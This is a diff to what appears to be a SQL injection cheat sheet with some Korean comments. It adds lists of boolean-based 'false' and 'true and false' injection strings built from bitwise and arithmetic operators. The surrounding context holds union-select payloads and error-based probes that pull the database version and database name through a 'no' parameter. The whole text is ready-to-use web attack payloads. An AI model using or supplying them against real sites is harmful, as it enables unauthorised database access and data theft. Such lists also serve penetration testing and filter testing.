@@ -19,6 +19,24 @@ no=1' union select 1,NULL--%20
 no=1' union select 1,2,NULL,version(),NULL--%20
 no=1' union select 1,2,NULL,(select version()),NULL--%20
 
+- false injection cheat sheet
+'|0--
+'&0--
+'^0--
+'<<0--
+'>>0--
+'&''--
+'%11&1--
+'^1^1--
+'|0&1--
+'*9--
+'/9--
+'%9--
+ 
+- true and false injection cheat sheet
+'<abs(1)--
+'<hex(1)--
+
 - 취약점을 찾은 후 긁어내기
 no=1 and @@version=1--
 no=1 and (select db_name())=1--
